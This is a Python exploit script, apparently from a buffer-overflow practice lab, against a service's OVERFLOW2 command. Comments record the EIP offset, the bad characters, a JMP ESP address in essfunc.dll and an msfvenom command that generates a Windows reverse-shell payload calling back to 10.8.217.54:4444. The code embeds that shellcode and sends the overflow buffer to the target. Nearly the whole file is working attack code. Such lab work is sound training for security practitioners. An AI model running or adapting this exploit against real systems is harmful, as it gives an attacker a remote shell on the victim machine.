import socket

#Log data, item 18 Address=0BADF00D Message=    EIP contains normal pattern : 0x76413176 (offset 634)

#bad character !mona bytearray -b "\x00\x23\x3c\x83\xba"

#ESP 01A7FA30

#unmodified

#Let's find the JUMP POINT

#!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
#Log data, item 11 Address=625011AF Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

#reverse the address due to little endian system 62 50 11 AF \xAF\x11\x50\x62

# GENERATE PAYLOAD msfvenom -p windows/shell_reverse_tcp LHOST=10.8.217.54 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c




ip = "10.10.83.19"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload=("\xfc\xbb\x9a\xa5\xe1\x39\xeb\x0c\x5e\x56\x31\x1e\xad\x01"
"\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x66\x4d\x63"
"\x39\x96\x8e\x04\xb3\x73\xbf\x04\xa7\xf0\x90\xb4\xa3\x54"
"\x1d\x3e\xe1\x4c\x96\x32\x2e\x63\x1f\xf8\x08\x4a\xa0\x51"
"\x68\xcd\x22\xa8\xbd\x2d\x1a\x63\xb0\x2c\x5b\x9e\x39\x7c"
"\x34\xd4\xec\x90\x31\xa0\x2c\x1b\x09\x24\x35\xf8\xda\x47"
"\x14\xaf\x51\x1e\xb6\x4e\xb5\x2a\xff\x48\xda\x17\x49\xe3"
"\x28\xe3\x48\x25\x61\x0c\xe6\x08\x4d\xff\xf6\x4d\x6a\xe0"
"\x8c\xa7\x88\x9d\x96\x7c\xf2\x79\x12\x66\x54\x09\x84\x42"
"\x64\xde\x53\x01\x6a\xab\x10\x4d\x6f\x2a\xf4\xe6\x8b\xa7"
"\xfb\x28\x1a\xf3\xdf\xec\x46\xa7\x7e\xb5\x22\x06\x7e\xa5"
"\x8c\xf7\xda\xae\x21\xe3\x56\xed\x2d\xc0\x5a\x0d\xae\x4e"
"\xec\x7e\x9c\xd1\x46\xe8\xac\x9a\x40\xef\xd3\xb0\x35\x7f"
"\x2a\x3b\x46\x56\xe9\x6f\x16\xc0\xd8\x0f\xfd\x10\xe4\xc5"
"\x52\x40\x4a\xb6\x12\x30\x2a\x66\xfb\x5a\xa5\x59\x1b\x65"
"\x6f\xf2\xb6\x9c\xf8\xf7\x4e\x47\xce\x6f\x4d\x77\x3e\x2c"
"\xd8\x91\x2a\xdc\x8c\x0a\xc3\x45\x95\xc0\x72\x89\x03\xad"
"\xb5\x01\xa0\x52\x7b\xe2\xcd\x40\xec\x02\x98\x3a\xbb\x1d"
"\x36\x52\x27\x8f\xdd\xa2\x2e\xac\x49\xf5\x67\x02\x80\x93"
"\x95\x3d\x3a\x81\x67\xdb\x05\x01\xbc\x18\x8b\x88\x31\x24"
"\xaf\x9a\x8f\xa5\xeb\xce\x5f\xf0\xa5\xb8\x19\xaa\x07\x12"
"\xf0\x01\xce\xf2\x85\x69\xd1\x84\x89\xa7\xa7\x68\x3b\x1e"
"\xfe\x97\xf4\xf6\xf6\xe0\xe8\x66\xf8\x3b\xa9\x87\x1b\xe9"
"\xc4\x2f\x82\x78\x65\x32\x35\x57\xaa\x4b\xb6\x5d\x53\xa8"
"\xa6\x14\x56\xf4\x60\xc5\x2a\x65\x05\xe9\x99\x86\x0c\xe9"
"\x1d\x79\xaf")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
